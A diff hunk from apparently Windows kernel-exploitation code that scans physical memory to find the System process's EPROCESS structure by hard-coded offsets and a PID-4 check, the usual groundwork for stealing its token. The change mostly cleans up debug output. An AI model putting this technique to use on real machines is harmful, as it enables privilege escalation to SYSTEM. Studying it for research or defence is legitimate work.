@@ -182,21 +182,19 @@ int searchPhysicalMemory(unsigned char* pattern, unsigned __int64 patternLength,
 						castedFourPages = (unsigned char*)castedFourPages + 0x2000;
 						// now castedFourPages and *buf point to the same memory
 						printf("\nFound pattern at: %p\n", (void*)(page + offset));
-						if ((page + offset) == 0x000000013C0615E7) {
-							printf("maybe right?\n");
-						}
+	
 						// add pattern offset
-						castedFourPages = (unsigned char*)castedFourPages + offset + 1;
+						castedFourPages = (unsigned char*)castedFourPages + offset;
 
 						EPROCESSBaseOfSystem = (unsigned char*)castedFourPages - 0x5A7;
-						if ((page + offset - 0x5A7) == 0x13c061040) {
-							printf("right EPROCESS base!");
-						}
-						UniqueProcessId = EPROCESSBaseOfSystem + 0x440;
+
+						UniqueProcessId = EPROCESSBaseOfSystem + 0x440; // don't know why the -1 is necessary (offset from windbg)
 						if ( 1 == 1 || (unsigned __int64)castedFourPages <= (unsigned __int64)UniqueProcessId && (unsigned __int64)UniqueProcessId <= (unsigned __int64)castedFourPages)
 						{
 							printf("Struct does fit into four pages.\n");
-							if (memcmp(UniqueProcessId, "0x0000000000000004", 8) == 0)
+							//                             0400000000000000
+							unsigned __int64 right = *((unsigned __int64*)UniqueProcessId);
+							if (right == 0x4)
 							{
 								// PID of System is 4
 								locations.push_back(patternLocation);
